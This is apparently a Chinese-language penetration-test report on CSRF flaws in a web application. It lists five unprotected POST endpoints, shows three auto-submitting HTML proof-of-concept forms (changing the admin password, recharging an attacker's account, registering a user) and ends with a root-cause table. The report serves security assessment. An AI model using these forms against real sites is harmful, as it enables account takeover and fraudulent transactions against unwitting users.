# 步骤 15 — CSRF 漏洞检测

> **测试日期:** 2026-07-13  
> **漏洞类型:** 跨站请求伪造（CSRF）  
> **影响范围:** 全部 5 个 POST 接口

---

## 一、检测结果

所有 POST 接口均无 CSRF Token、无 Referer/Origin 验证、无 SameSite Cookie 限制。

| 路由 | 方法 | CSRF 防护 |
|------|:----:|:--------:|
| `/login` | POST | ❌ 无 |
| `/register` | POST | ❌ 无 |
| `/upload` | POST | ❌ 无 |
| `/recharge` | POST | ❌ 无 |
| `/change-password` | POST | ❌ 无 |

---

## 二、攻击场景

### 场景 1：CSRF 修改密码

攻击者在恶意页面中构造隐藏表单，诱骗已登录管理员访问：

```html
<form action="http://目标服务器/change-password" method="POST">
    <input type="hidden" name="username" value="admin">
    <input type="hidden" name="new_password" value="hacked">
</form>
<script>document.forms[0].submit();</script>
```

管理员访问该页面后，密码被无声修改为 `hacked`，攻击者可用新密码登录。

### 场景 2：CSRF 越权充值

```html
<form action="http://目标服务器/recharge" method="POST">
    <input type="hidden" name="user_id" value="attacker">
    <input type="hidden" name="amount" value="99999">
</form>
<script>document.forms[0].submit();</script>
```

### 场景 3：CSRF 越权注册

```html
<form action="http://目标服务器/register" method="POST">
    <input type="hidden" name="username" value="evil">
    <input type="hidden" name="password" value="evil123">
</form>
```

---

## 三、根本原因

| 缺陷 | 说明 |
|------|------|
| 无 CSRF Token | 所有表单未生成和验证随机 token |
| 无 Referer 验证 | 未检查请求来源 |
| 无 SameSite Cookie | Cookie 未设置 SameSite 属性 |
